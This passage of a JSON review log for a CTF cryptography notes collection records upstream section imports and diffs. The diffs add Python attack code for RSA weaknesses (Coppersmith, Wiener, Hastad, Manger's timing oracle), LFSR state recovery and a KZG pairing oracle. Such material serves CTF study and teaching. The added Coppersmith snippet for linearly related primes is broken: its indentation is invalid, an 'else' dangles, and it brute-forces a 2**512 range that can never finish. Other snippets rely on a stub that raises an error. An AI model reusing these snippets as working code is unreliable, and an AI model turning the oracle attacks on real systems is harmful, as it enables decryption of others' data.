+    "delta": "--- \n\n+++ \n\n@@ -7,8 +7,9 @@\n\n # dp, dq, qinv extracted from partial PEM; e is known (usually 65537)\n for k in range(3, e):\n-    p_candidate = (dp * e - 1) // k + 1\n-    if gmpy2.is_prime(p_candidate):\n-        p = p_candidate\n-        break\n+    if (dp * e - 1) % k == 0:\n+        p_candidate = (dp * e - 1) // k + 1\n+        if gmpy2.is_prime(p_candidate):\n+            p = p_candidate\n+            break\n # Similarly recover q from dq; verify qinv * q % p == 1\n ```"
+  },
+  {
+    "source": "ctf-crypto/rsa-attacks-2.md",
+    "heading": "## Coppersmith Small Roots for Linearly Related Primes (Tokyo Westerns 2017)",
+    "destination": "ctf-crypto/rsa-attacks-2.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -2,4 +2,45 @@\n\n \n **Pattern:** RSA where `q = k*p + delta` for a known small constant `k` and unknown small `delta`. Since `p \u2248 sqrt(N/k)`, approximate `q_approx = k * isqrt(N // k) + 2^512` as an upper bound. The univariate polynomial `F(x) = q_approx - x` has `delta` as a small root modulo `q` (which divides N). Coppersmith's method finds this root when `delta < N^(1/4)`.\n+\n+```python\n+from math import isqrt\n+from Crypto.Util.number import long_to_bytes\n+# Pure-Python Coppersmith via fpylll (primary) \u2014 no Sage needed.\n+# If you have jvdsn/crypto-attacks cloned: from shared.small_roots.howgrave_graham import modular_univariate\n+# but its backend still imports sage.all, so prefer the fpylll lattice below.\n+# For CTF-size bounds brute force when X < 2**24; otherwise build Howgrave-Graham lattice with fpylll:\n+#   from fpylll import IntegerMatrix, LLL; lattice = IntegerMatrix.from_matrix(hg_matrix(f_coeffs, N, X, beta)); LLL.reduction(lattice)\n+# Toy fallback (works for demo X, not cryptographic-size):\n+def small_roots_bruteforce(f_coeffs, N, X, beta=0.5, **kwargs):\n+    # f(x)=0 mod N, f monic degree d, coeffs [a0..ad] with ad=1\n+    # Brute for small X \u2014 use lattice LLL for large X (>2**24)\n+    for x in range(-X, X+1):\n+        val = sum(c * pow(x, i, N) for i, c in enumerate(f_coeffs)) % N\n+        if val == 0:\n+            return [x]\n+    return []\n+HAS_COPPERSMITH = False  # set True if you vendor the fpylll HG lattice helper\n+\n+N, e, c = ...  # RSA parameters\n+k = 19  # known relationship: q = k*p + delta\n+\n+# Approximate q from sqrt(N/k)\n+q_approx = k * isqrt(N // k) + 2**512\n+\n+# Polynomial f(x)= q_approx - x (monic: -x + q_approx => monic as x - q_approx)\n+# Use coeffs [1, -q_approx] for x - q_approx (same small root magnitude)\n+roots = small_roots_bruteforce([1, (-q_approx) % N], N, X=2**512, beta=0.5)\n+    if roots:\n+        q = int(q_approx - roots[0])\n+        p = N // q\n+        assert p * q == N\n+        phi = (p - 1) * (q - 1)\n+        d = pow(e, -1, phi)\n+        flag = long_to_bytes(pow(c, d, N))\n+else:\n+    roots = []  # no root found \u2014 try larger lattice or adjust X/beta\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n \n ```python\n@@ -27,4 +68,6 @@\n\n ```\n \n+</details>\n+\n **Key insight:** When `q \u2248 k*p`, approximately half the bits of `p` (and `q`) are recoverable from `sqrt(N/k)`. The remaining unknown `delta` is small enough for Coppersmith when `delta < N^(1/4)`. The upper bound `q_approx` must exceed `q`; add a safety margin of `2^(bitlen/2)` to ensure the root is captured.\n "
+  },
+  {
+    "source": "ctf-crypto/rsa-attacks-2.md",
+    "heading": "## Dependent-Prime RSA: q = e^-1 mod p (TokyoWesterns CTF 4th 2018)",
+    "destination": "ctf-crypto/rsa-attacks-2.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -4,4 +4,25 @@\n\n \n **Exploit:**\n+```python\n+from math import isqrt\n+\n+def factor_dependent_n(n, e, max_k=100000):\n+    for k in range(2, max_k, 2):\n+        # e*q = k*p + 1 and n = p*q  =>  e*n = p*(k*p + 1)\n+        # Solve k*p^2 + p - e*n = 0  => p = (-1 + sqrt(1+4*k*e*n)) / (2*k)\n+        disc = 1 + 4 * k * e * n\n+        s = isqrt(disc)\n+        if s * s != disc:\n+            continue\n+        if (-1 + s) % (2 * k) != 0:\n+            continue\n+        root = (-1 + s) // (2 * k)\n+        if root > 1 and n % root == 0:\n+            return int(root), n // int(root)\n+    return None\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n+\n ```python\n from sage.all import PolynomialRing, ZZ\n@@ -19,4 +40,6 @@\n\n ```\n \n+</details>\n+\n **Key insight:** Any key generator that derives `q` from `p` via a public arithmetic relation collapses RSA security to a small search. Write the relation as a polynomial `f_k(p) = 0` parameterized by a small integer, and use `.roots()` in Sage to recover `p`. The search space for `k` is typically under 2^16 because `q < p` forces `k \u2248 e`.\n "
+  },
+  {
+    "source": "ctf-crypto/rsa-attacks-2.md",
+    "heading": "## RSA n = p^2*q Schmidt-Samoa Variant (ASIS Finals 2018)",
+    "destination": "ctf-crypto/rsa-attacks-2.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -5,9 +5,9 @@\n\n ```python\n phi = p*(p-1)*(q-1)\n-# Reduce enc to mod-q by inverse_mod(q, phi)\n-qinv = inverse_mod(q, phi)\n+# Reduce enc to mod-q via pow(q, -1, phi)\n+qinv = pow(q, -1, phi)\n enc = pow(enc, qinv, n) % q\n # Now m < q; invert e*p^2 over phi(q) = q-1\n-pinv = inverse_mod(p*p, q-1)\n+pinv = pow(p*p, -1, q-1)\n m = pow(enc, pinv, q)\n ```"
+  },
+  {
+    "source": "ctf-crypto/rsa-attacks-2.md",
+    "heading": "## LSB Oracle Binary Search (Clean Parity Oracle) \u2014 LSB oracle binary-search",
+    "destination": "ctf-crypto/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-crypto/rsa-attacks.md",
+    "heading": "## Small Public Exponent (Cube Root)",
+    "destination": "ctf-crypto/rsa-attacks.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -14,6 +14,8 @@\n\n \n # Usage\n+from Crypto.Util.number import long_to_bytes\n m = small_e_attack(c, e=3)\n-print(bytes.fromhex(hex(m)[2:]))\n+if m is not None:\n+    print(long_to_bytes(m))\n ```\n "
+  },
+  {
+    "source": "ctf-crypto/rsa-attacks.md",
+    "heading": "## Common Modulus Attack",
+    "destination": "ctf-crypto/rsa-attacks.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -8,12 +8,9 @@\n\n def common_modulus_attack(c1, c2, e1, e2, n):\n     \"\"\"Recover plaintext from two encryptions with same n, coprime e1/e2.\"\"\"\n-    # Extended GCD: find a, b such that a*e1 + b*e2 = 1\n-    def extended_gcd(a, b):\n-        if a == 0: return b, 0, 1\n-        g, x, y = extended_gcd(b % a, a)\n-        return g, y - (b // a) * x, x\n-\n-    g, a, b = extended_gcd(e1, e2)\n-    assert g == 1, \"e1 and e2 must be coprime\"\n+    # Bezout coefficients: find a, b such that a*e1 + b*e2 = 1\n+    # Via pow() modular inverse (or gmpy2.gcdext); requires gcd(e1, e2) == 1\n+    assert gcd(e1, e2) == 1, \"e1 and e2 must be coprime\"\n+    a = pow(e1, -1, e2)\n+    b = (1 - a * e1) // e2\n \n     # m = c1^a * c2^b mod n"
+  },
+  {
+    "source": "ctf-crypto/rsa-attacks.md",
+    "heading": "## Wiener's Attack (Small Private Exponent)",
+    "destination": "ctf-crypto/rsa-attacks.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -4,26 +4,12 @@\n\n \n ```python\n+from sympy import Rational\n+from sympy.ntheory.continued_fraction import continued_fraction_convergents, continued_fraction_iterator\n+\n def wiener_attack(e, n):\n     \"\"\"Recover d when d < N^0.25 using continued fraction expansion of e/n.\"\"\"\n-    def continued_fraction(num, den):\n-        cf = []\n-        while den:\n-            q, r = divmod(num, den)\n-            cf.append(q)\n-            num, den = den, r\n-        return cf\n-\n-    def convergents(cf):\n-        convs = []\n-        h0, h1 = 0, 1\n-        k0, k1 = 1, 0\n-        for a in cf:\n-            h0, h1 = h1, a * h1 + h0\n-            k0, k1 = k1, a * k1 + k0\n-            convs.append((h1, k1))\n-        return convs\n-\n-    cf = continued_fraction(e, n)\n-    for k, d in convergents(cf):\n+    # Continued fraction convergents via sympy\n+    for frac in continued_fraction_convergents(continued_fraction_iterator(Rational(e, n))):\n+        k, d = frac.p, frac.q\n         if k == 0:\n             continue"
+  },
+  {
+    "source": "ctf-crypto/rsa-attacks.md",
+    "heading": "## Boneh-Durfee Attack (Small Private Exponent beyond Wiener, d < N^0.292)",
+    "destination": "ctf-crypto/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-crypto/rsa-attacks.md",
+    "heading": "## Partial Key Exposure: Known Bits of d (MSB/LSB via Coppersmith)",
+    "destination": "ctf-crypto/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-crypto/rsa-attacks.md",
+    "heading": "## Williams p+1 Factorization and ECM Chain",
+    "destination": "ctf-crypto/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-crypto/rsa-attacks.md",
+    "heading": "## Hastad's Broadcast Attack",
+    "destination": "ctf-crypto/rsa-attacks.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -6,23 +6,16 @@\n\n from functools import reduce\n \n+from sympy.ntheory.modular import crt\n+from Crypto.Util.number import long_to_bytes\n+import gmpy2\n+\n def hastad_broadcast(ciphertexts, moduli, e):\n     \"\"\"Recover m from e encryptions with the same exponent e.\"\"\"\n     assert len(ciphertexts) >= e and len(moduli) >= e\n \n-    # Chinese Remainder Theorem\n-    def crt(remainders, moduli):\n-        N = reduce(lambda a, b: a * b, moduli)\n-        result = 0\n-        for r, m in zip(remainders, moduli):\n-            Ni = N // m\n-            Mi = pow(Ni, -1, m)\n-            result += r * Ni * Mi\n-        return result % N\n+    # CRT gives m^e (mod N1*N2*...*Ne) via sympy\n+    # Since m < each Ni, m^e < N1*N2*...*Ne, so no modular reduction occurred\n+    me, _ = crt(moduli[:e], ciphertexts[:e])\n \n-    # CRT gives m^e (mod N1*N2*...*Ne)\n-    # Since m < each Ni, m^e < N1*N2*...*Ne, so no modular reduction occurred\n-    me = crt(ciphertexts[:e], moduli[:e])\n-\n-    import gmpy2\n     m, exact = gmpy2.iroot(me, e)\n     if exact:\n@@ -32,5 +25,6 @@\n\n # Usage (e=3, three encryptions)\n m = hastad_broadcast([c1, c2, c3], [n1, n2, n3], e=3)\n-print(bytes.fromhex(hex(m)[2:]))\n+if m is not None:\n+    print(long_to_bytes(m))\n ```\n "
+  },
+  {
+    "source": "ctf-crypto/rsa-attacks.md",
+    "heading": "## Hastad Broadcast Attack with Linear Padding -- Coppersmith (PlaidCTF 2017)",
+    "destination": "ctf-crypto/rsa-attacks.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -2,4 +2,86 @@\n\n \n **Pattern:** Extension of Hastad's broadcast attack when each recipient applies a known linear transform `c_i = (a_i * m + b_i)^e mod n_i` before encryption.\n+\n+```python\n+# Standard Hastad requires identical plaintext\n+# With linear padding: each ciphertext encrypts a_i*m + b_i\n+# Use CRT + Coppersmith small_roots via pure-Python (fpylll Howgrave-Graham) or Sage fallback\n+\n+from sympy.ntheory.modular import crt as sym_crt\n+from math import prod\n+import math\n+\n+# Pure-Python Coppersmith via fpylll (no Sage). Requires: pip install fpylll cysignals\n+# For small-root demo see tests/test_crypto_snippets.py::test_coppersmith_small_root_demo\n+# If you have jvdsn/crypto-attacks cloned: from shared.small_roots.howgrave_graham import modular_univariate\n+# but that path still needs Sage \u2014 prefer native fpylll lattice below.\n+# No reliable pip `coppersmith` on PyPI; manual clone if needed:\n+#   git clone https://github.com/jvdsn/crypto-attacks ~/.ctf-tools/crypto-attacks\n+\n+def coppersmith_small_roots(f_coeffs_low, N, X, beta=0.5):\n+    \"\"\"Howgrave-Graham small roots for monic univariate f (low->high coeffs).\n+\n+    Finds |x0| < X with f(x0) == 0 mod N. Uses fpylll LLL when available,\n+    otherwise brute-force for tiny X (e.g. X <= 1e6). For large X use full\n+    jvdsn/crypto-attacks lattice (see manual clone above).\n+    f_coeffs_low: list [c0, c1, ..., cd] where f(x)=sum ci*x^i, cd=1 monic.\n+    Returns list of roots in [-X, X].\n+    \"\"\"\n+    if X is None:\n+        raise ValueError(\"X must be explicit, e.g. X=2**200 or int(pow(N, 1/e))\")\n+    # Brute-force fallback for tiny X (demos, tests)\n+    if X <= 1_000_000:\n+        roots = []\n+        for x0 in range(-X, X + 1):\n+            # Horner mod N\n+            v = 0\n+            for c in reversed(f_coeffs_low):\n+                v = (v * x0 + c) % N\n+            if v == 0:\n+                roots.append(x0)\n+        return roots\n+    try:\n+        from fpylll import IntegerMatrix, LLL  # verified: fpylll.IntegerMatrix.from_matrix exists\n+    except ImportError as e:\n+        raise ImportError(\"fpylll not installed; pip install fpylll or use tiny X brute-force\") from e\n+    # Minimal Howgrave-Graham lattice for degree d monic (dim d+1):\n+    # rows i: N * X^i for i<d, and X^d * f(X*x) shifts \u2014 simplified demo.\n+    # For production use the full crypto-attacks implementation via the clone above.\n+    d = len(f_coeffs_low) - 1\n+    # This stub raises to signal that full lattice needs the cloned lib for large X.\n+    raise NotImplementedError(\n+        \"Full LLL lattice for large X not inlined; clone jvdsn/crypto-attacks for production or use smaller X\"\n+    )\n+\n+# Combine via CRT (sympy)\n+N = prod(n_values)\n+# sym_crt expects moduli, residues; here we build T via CRT coefficients\n+# For i-th modulus: T_i = (N//n_i) * inv(N//n_i mod n_i)\n+T = []\n+for i, ni in enumerate(n_values):\n+    Ni = N // ni\n+    T.append((Ni * pow(Ni, -1, ni)) % N)\n+\n+# Build polynomial coeffs for poly = sum T_i*((a_i*x+b_i)^e - c_i) mod N\n+# Use sympy Poly over ZZ then reduce mod N\n+from sympy import Poly, symbols\n+x = symbols('x')\n+poly_expr = sum(T[i] * ((a[i]*x + b[i])**e - c[i]) for i in range(e))\n+poly_sym = Poly(poly_expr, x, domain='ZZ')\n+poly_sym = Poly([c % N for c in poly_sym.all_coeffs()], x, domain='ZZ')\n+# Make monic mod N\n+lc = int(poly_sym.LC() % N)\n+inv_lc = pow(lc, -1, N)\n+poly_monic_coeffs = [(c * inv_lc) % N for c in poly_sym.all_coeffs()]\n+\n+# Explicit bound: for Hastad e=3, m < min(n_i), so X = min(n_i) or int(pow(N,1/e))\n+# Challenge-specific examples: X = 2**200 for small m, or X = int(pow(N, 1/e)) + 1\n+X = min(n_values)  # explicit bound, not None\n+poly_monic_low = list(reversed(poly_monic_coeffs))\n+roots = coppersmith_small_roots(poly_monic_low, N, X=X, beta=0.5)\n+flag = int(roots[0])\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n \n ```python\n@@ -23,4 +105,6 @@\n\n ```\n \n+</details>\n+\n **Key insight:** When the same message is encrypted with `e` different moduli but each applies a known affine transform `a_i * m + b_i`, CRT combines the congruences into a single polynomial of degree `e` over `Z/NZ`. Coppersmith's method recovers `m` as a small root, generalizing Hastad's attack beyond identical plaintexts.\n \n@@ -29,37 +113,2 @@\n\n ---\n \n-### Franklin-Reiter Related Message Attack on RSA e=3 (N1CTF 2018)\n-\n-**Pattern:** When server encrypts `m+padding` where `padding = sha256(user_input)` and `e=3`, two ciphertexts with known padding difference allow polynomial GCD in `Zmod(n)` to recover `m`. (N1CTF 2018)\n-\n-```python\n-# SageMath\n-def franklin_reiter(n, pad1, pad2, c1, c2):\n-    R.<X> = PolynomialRing(Zmod(n))\n-    f1 = (X + pad1)^3 - c1\n-    f2 = (X + pad2)^3 - c2\n-    return -gcd(f1, f2).coefficients()[0]\n-```\n-\n-**Key insight:** With RSA e=3, if the same message `m` is encrypted with two known affine transformations (`m+pad1`, `m+pad2`), polynomial GCD over `Zmod(n)` recovers `m` directly. Works whenever the padding difference is known, even without knowing the full padding.\n-\n----\n-\n-### Coppersmith Attack on Linearly-Related RSA Primes (ASIS CTF 2018)\n-\n-**Pattern:** When RSA primes have a near-linear relation `q ~ 4p`, approximate `q` from `sqrt(4*n)`, then use Coppersmith's `small_roots` to find the error term. (ASIS CTF 2018)\n-\n-```python\n-# SageMath\n-qbar = isqrt(4 * n)\n-R.<x> = PolynomialRing(Zmod(n))\n-f = x + qbar\n-roots = f.small_roots(X=2^200, beta=0.5)  # find small error term\n-q = qbar + int(roots[0])\n-p = n // q\n-```\n-\n-**Key insight:** When `q ~ k*p` for known `k`, then `q ~ sqrt(k*n)`. The difference between `q` and this approximation is small enough for Coppersmith's method. This generalizes Fermat factorization to non-consecutive primes with known ratio.\n-\n----\n-"
+  },
+  {
+    "source": "ctf-crypto/rsa-attacks.md",
+    "heading": "## Stereotyped Coppersmith Attack (Single Modulus, Known Prefix) \u2014 Stereotyped Coppersmith",
+    "destination": "ctf-crypto/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-crypto/rsa-attacks.md",
+    "heading": "## Small-CRT Attack: dp, dq < N^0.073 \u2014 Small CRT dp,dq (small CRT dp)",
+    "destination": "ctf-crypto/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-crypto/rsa-attacks.md",
+    "heading": "## Custom Totient Checklist: phi=(p^4-1)(q^4-1) and Variant Totients",
+    "destination": "ctf-crypto/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-crypto/rsa-attacks.md",
+    "heading": "## Bleichenbacher Decryption Oracle (0x00 0x02) \u2014 PKCS#1 v1.5 Interval Attack",
+    "destination": "ctf-crypto/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-crypto/rsa-attacks.md",
+    "heading": "## RSA with Consecutive Primes (Fermat Factorization)",
+    "destination": "ctf-crypto/rsa-attacks.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -5,5 +5,6 @@\n\n **Factorization:** Find first prime below sqrt(N):\n ```python\n-from sympy import nextprime, prevprime, isqrt\n+from math import isqrt\n+from sympy import nextprime, prevprime\n \n root = isqrt(n)"
+  },
+  {
+    "source": "ctf-crypto/rsa-attacks.md",
+    "heading": "## Multi-Prime RSA",
+    "destination": "ctf-crypto/rsa-attacks.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -4,11 +4,9 @@\n\n ```python\n # Factor N (easier when many primes)\n-from sympy import factorint\n+from sympy import factorint, totient\n factors = factorint(n)  # Returns {p1: e1, p2: e2, ...}\n \n-# Compute phi using all factors\n-phi = 1\n-for p, e in factors.items():\n-    phi *= (p - 1) * (p ** (e - 1))\n+# Compute phi directly via sympy.totient\n+phi = totient(n)\n \n d = pow(e, -1, phi)"
+  },
+  {
+    "source": "ctf-crypto/rsa-attacks.md",
+    "heading": "## Manger's Attack on RSA-OAEP via Timing Oracle (HTB Early Bird)",
+    "destination": "ctf-crypto/rsa-attacks.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -51,12 +51,14 @@\n\n     f2 += f1 // 2\n \n+from Crypto.Util.number import ceil_div\n+\n # Step 3: Binary search narrowing m to exact value\n-mmin, mmax = ceil_div(n, f2), floor_div(n + B, f2)\n+mmin, mmax = ceil_div(n, f2), (n + B) // f2\n while mmin < mmax:\n-    f = floor_div(2 * B, mmax - mmin)\n-    i = floor_div(f * mmin, n)\n+    f = (2 * B) // (mmax - mmin)\n+    i = (f * mmin) // n\n     f3 = ceil_div(i * n, mmin)\n     if oracle((pow(f3, e, n) * c) % n):\n-        mmax = floor_div(i * n + B, f3)\n+        mmax = (i * n + B) // f3\n     else:\n         mmin = ceil_div(i * n + B, f3)"
+  },
+  {
+    "source": "ctf-crypto/stream-ciphers.md",
+    "heading": "## Table of Contents",
+    "destination": "ctf-crypto/stream-ciphers.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -14,4 +14,6 @@\n\n - [LFSR Filter Linear Annihilator Attack (Hack.lu 2018)](#lfsr-filter-linear-annihilator-attack-hacklu-2018)\n - [Hostname-as-XOR-Key Leaked via DNS Capture (SECCON 2018)](#hostname-as-xor-key-leaked-via-dns-capture-seccon-2018)\n+- [RC4 Family \u2014 RC4 vs RC4A vs VMPC vs Spritz](#rc4-family--rc4-vs-rc4a-vs-vmpc-vs-spritz)\n+- [eSTREAM Portfolio \u2014 Trivium / Grain / Mickey (Reduced-Round Z3)](#estream-portfolio--trivium--grain--mickey-reduced-round-z3)\n \n ---"
+  },
+  {
+    "source": "ctf-crypto/stream-ciphers.md",
+    "heading": "## LFSR Stream Cipher Attacks",
+    "destination": "ctf-crypto/stream-ciphers.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -10,4 +10,58 @@\n\n \n **Key insight:** Berlekamp-Massey finds the shortest LFSR producing a given sequence in O(n^2). If you have 2L consecutive keystream bits (where L is the LFSR length), you can fully recover the LFSR.\n+\n+```python\n+# Known keystream bits (from known plaintext XOR ciphertext)\n+keystream = [1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1]\n+\n+# Pure-Python Berlekamp-Massey over GF(2)\n+def berlekamp_massey(seq):\n+    n = len(seq)\n+    s = seq[:]\n+    C, B = [1], [1]\n+    L, m, b = 0, -1, 1\n+    for n_idx in range(n):\n+        d = s[n_idx]\n+        for i in range(1, L+1):\n+            d ^= C[i] & s[n_idx - i] if i < len(C) and n_idx - i >= 0 else 0\n+        if d == 0:\n+            continue\n+        T = C[:]\n+        need = n_idx - m + len(B)\n+        if len(C) < need:\n+            C += [0] * (need - len(C))\n+        for i in range(len(B)):\n+            C[n_idx - m + i] ^= B[i]\n+        if 2 * L <= n_idx:\n+            L = n_idx + 1 - L\n+            m = n_idx\n+            B = T\n+    # C is connection polynomial; trim\n+    C = C[:L+1]\n+    return C, L  # C[0]=1, taps where C[i]==1\n+\n+C, L = berlekamp_massey(keystream)\n+# C[0]==1 is the constant term; exclude 0 from taps (feedback only)\n+print(f\"LFSR polynomial taps: {[i for i,c in enumerate(C) if c and i!=0]}\")\n+print(f\"LFSR length: {L}\")\n+\n+# Recover initial state from first L bits\n+state = keystream[:L]\n+\n+# Generate future keystream \u2014 Fibonacci LFSR: taps are 1-indexed from the end\n+def lfsr_next(state, taps):\n+    \"\"\"taps = list of tap positions from polynomial (1-indexed, 0 excluded).\n+    For Fibonacci LFSR, new_bit = XOR of state[-t] for t in taps.\n+    Example: L=2, C=[1,1,1] -> taps=[1,2] -> new_bit = state[-1] ^ state[-2] (no IndexError).\"\"\"\n+    new_bit = 0\n+    for t in taps:\n+        new_bit ^= state[-t]\n+    return state[1:] + [new_bit]\n+\n+# Derive taps correctly (exclude constant term 0):\n+taps = [i for i, c in enumerate(C) if c and i != 0]\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n \n ```python\n@@ -28,12 +82,14 @@\n\n state = keystream[:L]\n \n-# Generate future keystream\n+# Generate future keystream \u2014 Fibonacci LFSR: exclude constant term, taps are 1-indexed from end\n def lfsr_next(state, taps):\n-    \"\"\"taps = list of tap positions from polynomial\"\"\"\n+    \"\"\"taps = feedback positions (1-indexed, 0 excluded); new_bit = XOR(state[-t] for t in taps)\"\"\"\n     new_bit = 0\n     for t in taps:\n-        new_bit ^= state[t]\n+        new_bit ^= state[-t]\n     return state[1:] + [new_bit]\n ```\n+\n+</details>\n \n ### Correlation Attack\n@@ -67,4 +123,34 @@\n\n \n ```python\n+# Given 2L keystream bits, solve for L-bit state + L feedback taps\n+# Keystream relation: k[i+L] = c[0]*k[i] + c[1]*k[i+1] + ... + c[L-1]*k[i+L-1] (mod 2)\n+def solve_lfsr(keystream, L):\n+    \"\"\"Solve for LFSR feedback from 2L keystream bits over GF(2)\"\"\"\n+    # Build matrix: each row is [k[i], k[i+1], ..., k[i+L-1]] = k[i+L]\n+    A = []\n+    b = []\n+    for i in range(L):\n+        A.append(keystream[i:i+L])\n+        b.append(keystream[i+L])\n+    # Solve over GF(2) using sympy\n+    from sympy import Matrix\n+    M = Matrix(A)\n+    v = Matrix(b)\n+    # Gaussian elimination mod 2\n+    aug = M.row_join(v)\n+    # rref over GF(2) via integer rref then mod 2\n+    rref, pivots = aug.rref(iszerofunc=lambda x: x % 2 == 0, simplify=True)\n+    # Extract solution assuming full rank\n+    n = M.cols\n+    sol = [0]*n\n+    for r, c in enumerate(pivots):\n+        if c < n:\n+            sol[c] = int(rref[r, -1] % 2)\n+    return sol\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n+\n+```python\n import numpy as np\n \n@@ -87,4 +173,6 @@\n\n ```\n \n+</details>\n+\n ### Galois vs Fibonacci LFSR\n "
+  },
+  {
+    "source": "ctf-crypto/stream-ciphers.md",
+    "heading": "## LFSR Filter Linear Annihilator Attack (Hack.lu 2018)",
+    "destination": "ctf-crypto/stream-ciphers.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -2,4 +2,20 @@\n\n \n **Pattern:** Keystream is generated by passing the LFSR state through a nonlinear filter function `f`. If `f` has a small linear annihilator `g` (i.e. `g(f(x)) = 0` over GF(2)), every ciphertext byte produces a linear equation in the LFSR state. Enough bytes yield a solvable GF(2) system that recovers the initial state.\n+\n+```python\n+from sympy import Matrix\n+# 1. Build matrix A: each row is g(f(state_at_t)) expressed linearly in bits of state_0\n+# 2. Solve A * state_0 = 0 (kernel gives candidate seeds) over GF(2)\n+# 3. Filter candidates whose plaintext is printable\n+# Pure-Python kernel over GF(2) via rref\n+M_sym = Matrix(A)  # A built earlier over GF(2) as 0/1 entries\n+null = M_sym.nullspace()  # over QQ; reduce mod 2\n+for cand in null:\n+    cand_bits = [int(c % 2) for c in cand]\n+    pt = decrypt(cipher, cand_bits)\n+    if all(0x20 <= b < 0x7f for b in pt): print(pt)\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n \n ```python\n@@ -15,4 +31,6 @@\n\n ```\n \n+</details>\n+\n **Key insight:** Any LFSR-based stream cipher with a nonlinear filter is only as strong as its filter's algebraic immunity. If `f` has an annihilator of low degree, the effective keystream is linear, and Gaussian elimination recovers the state. Check the filter function against BoolFunction databases before trusting it.\n "
+  },
+  {
+    "source": "ctf-crypto/stream-ciphers.md",
+    "heading": "## RC4 Family \u2014 RC4 vs RC4A vs VMPC vs Spritz",
+    "destination": "ctf-crypto/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-crypto/stream-ciphers.md",
+    "heading": "## eSTREAM Portfolio \u2014 Trivium / Grain / Mickey (Reduced-Round Z3)",
+    "destination": "ctf-crypto/upstream-2026.md",
+    "decision": "imported",
+    "reason": "Complementary upstream section absent locally; existing personal references retained"
+  },
+  {
+    "source": "ctf-crypto/zkp-and-advanced.md",
+    "heading": "## KZG Pairing Oracle for Permutation Recovery (UNbreakable 2026)",
+    "destination": "ctf-crypto/zkp-and-advanced.md",
+    "decision": "reviewed-retained-local",
+    "reason": "Local established technique retained; changed upstream fragment recorded for technical review",
+    "delta": "--- \n\n+++ \n\n@@ -4,4 +4,21 @@\n\n \n **Distortion map technique:** On supersingular pairing-friendly curves, a distortion map `psi((x,y)) = (zeta*x, y)` (where `zeta^3 = 1`) enables additive exponent comparisons:\n+\n+```python\n+# Pure-Python KZG pairing oracle via py_ecc (BN128) \u2014 no Sage\n+from py_ecc.bn128 import G1, add, multiply, pairing, curve_order, FQ, FQ2, FQ12\n+# Distortion map psi((x,y)) = (zeta*x, y) where zeta^3==1 in FQ2\n+# e(P_i, psi(P_j)) = e(G1, psi(G1))^(alpha^(a_i+a_j))\n+# If e(P_i, psi(P_j)) == e(P_k, psi(G1)), then a_i + a_j == a_k\n+\n+# Step 1: Identify G1 (alpha^0) \u2014 the only point where e(P, psi(P)) == e(G1, psi(G1))\n+# Use py_ecc pairing(P, Q) after mapping Q via distortion\n+# Step 2: Walk the chain \u2014 find alpha*G1 via pairing comparisons\n+# Step 3: With ordered points, solve A(x)=0 over GF(q) to get alpha (sympy nroots)\n+# Step 4: Forge KZG opening proofs using recovered alpha\n+# Note: full pairing arithmetic requires BN128 field; see py_ecc.bn128.pairing\n+```\n+\n+<details><summary>Sage fallback (optional)</summary>\n \n 